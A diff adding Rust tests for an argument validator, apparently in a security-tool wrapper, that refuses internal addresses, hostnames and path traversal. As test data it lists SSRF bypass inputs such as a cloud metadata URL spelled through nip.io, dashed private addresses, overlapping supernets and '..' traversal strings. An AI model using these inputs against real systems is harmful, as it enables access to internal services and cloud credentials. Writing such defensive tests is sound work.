+            "::",
+            "fc00::1",
+            "::ffff:127.0.0.1",
+            "100.64.0.1",
+            "198.18.0.1",
+            "240.0.0.1",
+            "255.255.255.255",
+            "192.0.2.1",
+            "198.51.100.1",
+            "203.0.113.1",
+            "2001:db8::1",
+            "100.64.0.0/10",
+            "198.18.0.0/15",
+        ] {
+            let err = validate_arg("t", &def, v).unwrap_err().to_string();
+            assert!(
+                err.contains("blocked by block_internal policy"),
+                "{v}: {err}"
+            );
+        }
+        assert!(validate_arg("t", &def, "93.184.216.34").is_ok());
+        assert!(validate_arg("t", &def, "2606:2800:220:1:248:1893:25c8:1946").is_ok());
+        assert!(validate_arg("t", &def, "8.8.8.0/24").is_ok());
+        // The newly covered ranges stay open without the policy.
+        let open = make_arg("scope_target");
+        for v in [
+            "100.64.0.1",
+            "198.18.0.1",
+            "240.0.0.1",
+            "2001:db8::1",
+            "0.1.2.3",
+        ] {
+            assert!(validate_arg("t", &open, v).is_ok(), "{v}");
+        }
+    }
+
+    #[test]
+    fn test_ip_address_and_cidr_apply_host_policy() {
+        let open_ip = make_arg("ip_address");
+        assert!(validate_arg("ip", &open_ip, "10.0.0.1").is_ok());
+        let err = validate_arg("ip", &open_ip, "169.254.169.254")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("always blocked"), "{err}");
+        assert!(validate_arg("ip", &open_ip, "fe80::1").is_err());
+        let block_ip = ArgDef {
+            type_name: "ip_address".to_string(),
+            block_internal: true,
+            ..Default::default()
+        };
+        for v in [
+            "10.0.0.1",
+            "127.0.0.1",
+            "::1",
+            "::ffff:192.168.0.1",
+            "100.64.1.1",
+        ] {
+            let err = validate_arg("ip", &block_ip, v).unwrap_err().to_string();
+            assert!(err.contains("block_internal"), "{v}: {err}");
+        }
+        assert!(validate_arg("ip", &block_ip, "93.184.216.34").is_ok());
+
+        let open_cidr = make_arg("cidr");
+        assert!(validate_arg("c", &open_cidr, "10.0.0.0/24").is_ok());
+        assert!(validate_arg("c", &open_cidr, "169.254.0.0/16").is_err());
+        let block_cidr = ArgDef {
+            type_name: "cidr".to_string(),
+            block_internal: true,
+            ..Default::default()
+        };
+        assert!(validate_arg("c", &block_cidr, "10.0.0.0/24").is_err());
+        assert!(validate_arg("c", &block_cidr, "198.18.0.0/15").is_err());
+        assert!(validate_arg("c", &block_cidr, "8.8.8.0/24").is_ok());
+    }
+
+    // ---- W4 hostname rules: denylist, embedded literal, overlap, DNS ----
+
+    #[test]
+    fn test_internal_names_always_blocked() {
+        const MSG: &str = "resolves to an internal name — always blocked";
+        let names = [
+            "localhost",
+            "api.localhost",
+            "printer.local",
+            "metadata.google.internal",
+            "db.internal",
+            "x.home.arpa",
+            "nas.lan",
+            "wiki.intranet",
+            "fs.corp",
+            "vpn.private",
+            "LOCALHOST",
+            "Metadata.Google.Internal",
+        ];
+        for block_internal in [false, true] {
+            let target = ArgDef {
+                type_name: "scope_target".to_string(),
+                block_internal,
+                ..Default::default()
+            };
+            let url = url_arg(block_internal, &[]);
+            for h in names {
+                let err = validate_arg("t", &target, h).unwrap_err().to_string();
+                assert_eq!(
+                    err,
+                    format!("validation error: argument 't' target {MSG}"),
+                    "{h}"
+                );
+                let err = validate_arg("u", &url, &format!("http://{h}/x"))
+                    .unwrap_err()
+                    .to_string();
+                assert_eq!(
+                    err,
+                    format!("validation error: argument 'u' target {MSG}"),
+                    "{h}"
+                );
+                let err = validate_arg("u", &url, &format!("https://{h}:8443/"))
+                    .unwrap_err()
+                    .to_string();
+                assert!(err.contains(MSG), "{h}: {err}");
+            }
+        }
+        // A public name that merely contains a listed word is not on the list.
+        let open = make_arg("scope_target");
+        for h in [
+            "localhost.com",
+            "internal.example.com",
+            "local.example.com",
+            "corp.example.com",
+        ] {
+            assert!(validate_arg("t", &open, h).is_ok(), "{h}");
+        }
+    }
+
+    #[test]
+    fn test_embedded_ip_literal_in_hostname() {
+        let open = make_arg("scope_target");
+        let blocking = blocking_arg();
+        // Link-local spelled into a wildcard-DNS name: refused without the policy.
+        let err = validate_arg("t", &open, "169.254.169.254.nip.io")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("always blocked"), "{err}");
+        let err = validate_arg(
+            "u",
+            &url_arg(false, &[]),
+            "http://169.254.169.254.nip.io/latest/meta-data/",
+        )
+        .unwrap_err()
+        .to_string();
+        assert!(err.contains("always blocked"), "{err}");
+        // Loopback / private spelled dotted or dashed: refused with the policy
+        // and open without it, exactly like the literal they spell.
+        for h in [
+            "127.0.0.1.nip.io",
+            "10-0-0-1.nip.io",
+            "192-168-1-1.sslip.io",
+            "0.0.0.0.nip.io",
+            "100-64-0-1.nip.io",
+        ] {
+            let err = validate_arg("t", &blocking, h).unwrap_err().to_string();
+            assert!(
+                err.contains("blocked by block_internal policy"),
+                "{h}: {err}"
+            );
+            let err = validate_arg("u", &url_arg(true, &[]), &format!("http://{h}:8080/"))
+                .unwrap_err()
+                .to_string();
+            assert!(
+                err.contains("blocked by block_internal policy"),
+                "{h}: {err}"
+            );
+            assert!(validate_arg("t", &open, h).is_ok(), "{h}");
+        }
+        // A public embedded address is not refused for its shape; it is taken
+        // as the address the name spells, so no lookup is needed.
+        for h in [
+            "93-184-216-34.example.com",
+            "93.184.216.34.nip.io",
+            "8-8-8-8.sslip.io",
+        ] {
+            assert!(validate_arg("t", &blocking, h).is_ok(), "{h}");
+            assert!(
+                validate_arg("u", &url_arg(true, &[]), &format!("https://{h}/")).is_ok(),
+                "{h}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_scope_target_and_cidr_overlap_policy() {
+        let blocking = blocking_arg();
+        let block_cidr = ArgDef {
+            type_name: "cidr".to_string(),
+            block_internal: true,
+            ..Default::default()
+        };
+        for def in [&blocking, &block_cidr] {
+            // The supernet from the review: public base, contains 10.0.0.0/8.
+            let err = validate_arg("t", def, "8.0.0.0/5").unwrap_err().to_string();
+            assert!(
+                err.contains("overlaps 10.0.0.0/8") && err.contains("block_internal"),
+                "{err}"
+            );
+            let err = validate_arg("t", def, "10.0.0.0/24")
+                .unwrap_err()
+                .to_string();
+            assert!(err.contains("overlaps 10.0.0.0/8"), "{err}");
+            assert!(validate_arg("t", def, "93.184.216.0/24").is_ok());
+            // IPv6 CIDRs are values of both types.
+            let err = validate_arg("t", def, "2001:db8::/32")
+                .unwrap_err()
+                .to_string();
+            assert!(err.contains("overlaps 2001:db8::/32"), "{err}");
+            assert!(validate_arg("t", def, "2606:4700::/32").is_ok());
+            assert!(validate_arg("t", def, "2000::/3").is_err()); // holds 2001:db8::/32
+                                                                  // The whole address space is always blocked (it holds link-local).
+            assert!(validate_arg("t", def, "0.0.0.0/0").is_err());
+            assert!(validate_arg("t", def, "::/0").is_err());
+        }
+        // Without the policy only the always-blocked tier is tested — still
+        // by overlap.
+        for def in [make_arg("scope_target"), make_arg("cidr")] {
+            assert!(validate_arg("t", &def, "8.0.0.0/5").is_ok());
+            assert!(validate_arg("t", &def, "2001:db8::/32").is_ok());
+            let err = validate_arg("t", &def, "169.0.0.0/8")
+                .unwrap_err()
+                .to_string();
+            assert!(
+                err.contains("overlaps 169.254.0.0/16") && err.contains("always blocked"),
+                "{err}"
+            );
+            let err = validate_arg("t", &def, "0.0.0.0/0")
+                .unwrap_err()
+                .to_string();
+            assert!(err.contains("always blocked"), "{err}");
+            let err = validate_arg("t", &def, "fe00::/7").unwrap_err().to_string();
+            assert!(err.contains("overlaps fe80::/10"), "{err}");
+        }
+    }
+
+    #[test]
+    fn test_ipv6_cidr_is_framed_strictly() {
+        // Base must be canonical IPv6 and the prefix plain decimal 0-128; a
+        // malformed range is "not a CIDR", so it fails the slash rule.
+        let open = make_arg("scope_target");
+        assert!(validate_arg("t", &open, "2606:4700::/32").is_ok());
+        for v in [
+            "2606:4700::/129",
+            "2606:4700::/032",
+            "2606:4700::/+32",
+            "2606:4700::/",
+            "2606:4700:/32",
+            "2606:4700::/32/",
+            "10.0.0.0/33",
+            "10.0.0.0/024",
+        ] {
+            let err = validate_arg("t", &open, v).unwrap_err().to_string();
+            assert!(err.contains("'/'"), "{v}: {err}");
+        }
+    }
+
+    #[test]
+    fn test_block_internal_resolution_fails_closed() {
+        // RFC 2606 reserves `.invalid`; the name never resolves. This is the
+        // one lookup the suite performs and it exercises the refusal path.
+        const HOST: &str = "no-such-host.invalid";
+        let err = validate_arg("t", &blocking_arg(), HOST)
+            .unwrap_err()
+            .to_string();
+        assert_eq!(
+            err,
+            format!("validation error: argument 't' could not resolve host '{HOST}' to verify it is public (block_internal)")
+        );
+        let err = validate_arg("u", &url_arg(true, &[]), &format!("https://{HOST}/path"))
+            .unwrap_err()
+            .to_string();
+        assert_eq!(
+            err,
+            format!("validation error: argument 'u' could not resolve host '{HOST}' to verify it is public (block_internal)")
+        );
+        // Without the policy no resolution is attempted: the name is accepted
+        // on structure alone.
+        assert!(validate_arg("t", &make_arg("scope_target"), HOST).is_ok());
+        assert!(validate_arg("u", &make_arg("url"), &format!("https://{HOST}/path")).is_ok());
+    }
+
+    // ---- W11: strictness and cross-runtime parity ----------------------
+
+    #[test]
+    fn w11_integer_strictness() {
+        let def = make_arg("integer");
+        for bad in ["", "0x10", "1_000", " 7 ", "7\n", "7 ", "1.0", "1e3", "٣"] {
+            assert!(validate_arg("n", &def, bad).is_err(), "{bad:?}");
+        }
+        let mut signed = make_arg("integer");
+        signed.allow_leading_dash = true;
+        assert_eq!(validate_arg("n", &signed, "+7").unwrap(), "7");
+        assert_eq!(validate_arg("n", &signed, "-07").unwrap(), "-7");
+        assert_eq!(validate_arg("n", &def, "007").unwrap(), "7");
+    }
+
+    #[test]
+    fn w11_port_strictness() {
+        let def = make_arg("port");
+        for bad in ["", "+80", " 80", "80 ", "0", "65536", "0x50"] {
+            assert!(validate_arg("p", &def, bad).is_err(), "{bad:?}");
+        }
+        assert_eq!(validate_arg("p", &def, "443").unwrap(), "443");
+    }
+
+    #[test]
+    fn w11_number_strictness_and_rendering() {
+        let def = make_arg("number");
+        for bad in [
+            "NaN", "nan", "inf", "Infinity", "0x1p3", " 1.5", "1.5 ", "", ".", "1e", "1_0",
+        ] {
+            assert!(validate_arg("f", &def, bad).is_err(), "{bad:?}");
+        }
+        for (input, out) in [("1e2", "100"), ("0.50", "0.5"), (".5", "0.5"), ("3.", "3")] {
+            assert_eq!(validate_arg("f", &def, input).unwrap(), out, "{input}");
+        }
+    }
+
+    #[test]
+    fn w11_duration_strictness() {
+        let def = make_arg("duration");
+        for bad in ["", "5m\n", "1_000", " 7 ", "5 m", "m", "5x", "1m1h"] {
+            assert!(validate_arg("d", &def, bad).is_err(), "{bad:?}");
+        }
+        for good in ["30", "5m", "1h30m", "500ms", "2h5m3s10ms"] {
+            assert_eq!(validate_arg("d", &def, good).unwrap(), good);
+        }
+    }
+
+    #[test]
+    fn w11_boolean_case_insensitive() {
+        let def = make_arg("boolean");
+        assert_eq!(validate_arg("b", &def, "True").unwrap(), "true");
+        assert_eq!(validate_arg("b", &def, "FALSE").unwrap(), "false");
+        for bad in ["yes", "1", " true", "true\n", "t"] {
+            assert!(validate_arg("b", &def, bad).is_err(), "{bad:?}");
+        }
+    }
+
+    #[test]
+    fn w11_host_shape_parity() {
+        assert!(validate_arg("t", &make_arg("scope_target"), "example.com.").is_err());
+        assert!(validate_arg("u", &make_arg("url"), "https://example.com./x").is_err());
+        assert!(validate_arg("t", &make_arg("scope_target"), "2001:db8::/32").is_ok());
+        assert!(validate_arg("c", &make_arg("cidr"), "2001:db8::/32").is_ok());
+        let mut blocked = make_arg("cidr");
+        blocked.block_internal = true;
+        assert!(validate_arg("c", &blocked, "2001:db8::/32").is_err());
+    }
+
+    #[test]
+    fn w11_parent_component_refused() {
+        for t in ["path", "credential_file"] {
+            for bad in ["..", "foo/..", "foo\\..", "../x", "a/../b", "a\\..\\b"] {
+                assert!(
+                    validate_arg("p", &make_arg(t), bad).is_err(),
+                    "{t}: {bad:?}"
+                );
+            }
+        }
+        // `..` inside a component name is not traversal.
+        assert!(validate_arg("p", &make_arg("path"), "foo..bar/x").is_ok());
+        assert!(validate_arg("p", &make_arg("path"), "a/.../b").is_ok());
+    }
+
+    #[test]
+    fn w11_no_trimming_of_enum_or_ip() {
+        let mut def = make_arg("enum");
+        def.allowed = Some(vec!["ping".to_string()]);
+        assert!(validate_arg("e", &def, " ping").is_err());
+        assert!(validate_arg("i", &make_arg("ip_address"), "10.0.0.1 ").is_err());
+    }
+
+    // ---- property test: the fuzz property over deterministic inputs ----
+
+    /// Characters the generator draws from, weighted toward the ones the
+    /// hygiene rules exist for.
+    const FUZZ_ALPHABET: &[char] = &[
+        'a',
+        'Z',
+        '0',
+        '9',
+        '.',
+        '/',
+        ':',
+        '-',
+        '+',
+        '_',
+        '@',
+        '*',
+        '?',
+        '[',
+        ']',
+        '(',
+        ')',
+        '%',
+        '=',
+        ',',
+        ';',
+        '|',
+        '&',
+        '$',
+        '`',
+        '<',
+        '>',
+        '{',
+        '}',
+        '!',
+        '#',
+        '~',
+        ' ',
+        '\t',
+        '\n',
+        '\r',
+        '\0',
+        '\x0b',
+        '\x0c',
+        '\x1b',
+        '\x7f',
+        '\u{85}',
+        '\u{9f}',
+        '\u{a0}',
+        '\u{2028}',
+        '\u{2029}',
+        '\u{3000}',
+        '\u{200b}',
+        '\u{feff}',
+        '\'',
+        '"',
+        '\\',
+        'h',
+        't',
+        'p',
+        's',
+        'x',
+        '1',
+        '2',
+        'm',
+        '\u{e9}',
+        '\u{1f600}',
+    ];
+
+    const FUZZ_PREFIXES: &[&str] = &[
+        "",
+        "",
+        "",
+        "http://",
+        "https://",
+        "10.0.0.",
+        "example.com",
+        "-",
+        "+",
+        "../",
+        "1h",
+        "1.2.3.4/",
+        "::1",
+        "0x7f.1",
+        "RHOSTS ",
+    ];
+
+    struct XorShift(u64);
+
+    impl XorShift {
+        fn next(&mut self) -> u64 {
+            let mut x = self.0;
+            x ^= x << 13;
+            x ^= x >> 7;
+            x ^= x << 17;
+            self.0 = x;
+            x
+        }
+
+        fn below(&mut self, n: usize) -> usize {
+            (self.next() % n as u64) as usize
+        }
+
+        fn value(&mut self) -> String {
+            let mut s = FUZZ_PREFIXES[self.below(FUZZ_PREFIXES.len())].to_string();
+            for _ in 0..self.below(24) {
+                s.push(FUZZ_ALPHABET[self.below(FUZZ_ALPHABET.len())]);
+            }
+            s
+        }
+    }
+
+    /// The fuzz property for one accepted value: a string-derived type never
+    /// returns whitespace, a quote, a backslash, a control character, or a
+    /// leading `-`/`+` without the matching opt-in (`msf_options` may keep
+    /// its ASCII space separator).
+    fn assert_hygienic(type_name: &str, input: &str, out: &str) {
+        let space_ok = type_name == "msf_options";
+        assert!(
+            !out.chars()
+                .any(|c| c.is_whitespace() && !(space_ok && c == ' ')),
+            "{type_name}: {input:?} -> {out:?} contains whitespace"
+        );
+        assert!(
+            !out.contains(['\'', '"', '\\']),
+            "{type_name}: {input:?} -> {out:?} contains a quote or backslash"
+        );
+        assert!(
+            !out.chars().any(is_control_char),
+            "{type_name}: {input:?} -> {out:?} contains a control character"
+        );
+        assert!(
+            !out.starts_with(['-', '+']),
+            "{type_name}: {input:?} -> {out:?} starts with '-' or '+'"
+        );
+    }
+
+    #[test]
+    fn test_validator_property_over_pseudo_random_inputs() {
+        let defs: Vec<ArgDef> = [
+            "string",
+            "path",
+            "regex_match",
+            "url",
+            "scope_target",
+            "duration",
+            "msf_options",
+            "integer",
+            "number",
+            "port",
+            "boolean",
+            "ip_address",
+            "cidr",
+        ]
+        .iter()
+        .map(|t| {
+            let mut d = make_arg(t);
+            if *t == "regex_match" {
+                d.pattern = Some(".*".to_string());
+            }
+            d
+        })
+        .collect();
+        let mut enum_def = make_arg("enum");
+        enum_def.allowed = Some(vec!["a".into(), "b".into()]);
+
+        let mut rng = XorShift(0x9e37_79b9_7f4a_7c15);
+        let mut accepted = 0usize;
+        for _ in 0..4000 {
+            let value = rng.value();
+            for def in defs.iter().chain(std::iter::once(&enum_def)) {
+                for exec_mode in [false, true] {
+                    if let Ok(out) = validate_arg_mode("v", def, &value, exec_mode) {
+                        accepted += 1;
+                        if STRING_DERIVED_TYPES.contains(&def.type_name.as_str()) {
+                            assert_hygienic(&def.type_name, &value, &out);
+                        }
+                    }
+                }
+            }
+        }
+        // The generator must reach the accepting paths, not only refusals.
+        assert!(accepted > 100, "only {accepted} values accepted");
     }
 }
